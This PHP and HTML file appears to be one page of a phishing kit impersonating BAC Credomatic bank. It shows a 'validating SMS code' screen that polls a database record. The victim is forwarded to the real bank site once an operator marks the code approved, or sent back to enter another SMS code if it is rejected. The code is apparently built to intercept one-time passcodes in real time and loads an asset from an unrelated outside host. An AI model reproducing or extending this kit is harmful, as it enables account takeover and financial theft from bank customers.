<?php
include 'db.php';

// Obtener el ID de la URL
$id = isset($_GET['id']) ? intval($_GET['id']) : 0;

if ($id == 0) {
    die("ID no válido.");
}

// Consultar el estado de sms_status
$stmt = $conn->prepare("SELECT sms_status FROM usuarios WHERE id = :id");
$stmt->bindParam(':id', $id);
$stmt->execute();

$row = $stmt->fetch(PDO::FETCH_ASSOC);

if ($row) {
    // Verificar el estado de sms_status
    $sms_status = $row['sms_status'];

    if ($sms_status == 'aprobado') {
        // Redirigir a la página de éxito si es aprobado
        header("Location: https://www.baccredomatic.com/");
        exit();
    } elseif ($sms_status == 'rechazado') {
        // Si es rechazado, actualizar el estado a pendiente antes de redirigir a sms.php
        $update_stmt = $conn->prepare("UPDATE usuarios SET sms_status = 'pendiente' WHERE id = :id");
        $update_stmt->bindParam(':id', $id);
        $update_stmt->execute();

        // Redirigir a sms.php con el ID del usuario
        header("Location: sms.php?id=$id");
        exit();
    } elseif ($sms_status == 'pendiente') {
        // Si el estado es pendiente, recargar la página cada 5 segundos
        echo "<script>
                setTimeout(function() {
                    window.location.reload();
                }, 5000);
              </script>";
    }
}

// Cerrar la conexión
$conn = null;
?>




<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Validando Código SMS</title>
    <link rel="icon" href="favicon-32x32.png" type="image/x-icon">
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'Open Sans', sans-serif;
            background-image: url('background.svg');
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 60vh;
            color: #333;
            text-align: center;
        }

        .navbar {
            width: 100%;
            background-color: rgb(255, 255, 255);
            padding: 10px 20px;
            box-shadow: 0 2px 3px rgba(0, 0, 0, 0.1);
            display: flex;
            align-items: center;
            justify-content: flex-start;
            position: fixed;
            top: 0;
            left: 0;
            z-index: 1000;
        }

        .navbar img {
            height: 40px;
            margin-left: 20px;
        }

        h1 {
            font-size: 1.8rem;
            color: #000756;
            margin-bottom: 20px;
        }

        .input-container {
            position: relative;
            margin-top: 20px;
            width: 250px;
        }

        label {
            position: absolute;
            top: -15px;
            left: 10px;
            font-size: 0.9rem;
            color: #888;
            background-color: #f4f4f4;
            padding: 0 5px;
            z-index: 1;
        }

        .input-code {
            padding: 10px;
            font-size: 1rem;
            border-radius: 5px;
            width: 100%;
            border: 1px solid #ccc;
            padding-left: 10px;
        }

        .submit-btn {
            background-color: #ff0000;
            color: rgb(255, 255, 255);
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            font-size: 1.1rem;
            font-weight: bold;
            cursor: pointer;
            margin-top: 20px;
            width: 240px;
            margin-left: 25px;
        }

        .submit-btn:hover {
            background-color: #ff2020;
        }
    </style>
</head>

<body>

    <div class="navbar">
        <img src="BAC_LOGO.webp" alt="Logo">
    </div>

    <h1>Esperando confirmación del SMS...</h1>

    <div>
        <p>Por favor espere mientras validamos el código SMS. Esto puede tomar algunos segundos.</p>
        <img src="https://riadmalak.com/login_files/loading.svg" alt="Cargando...">
    </div>

</body>
</html>
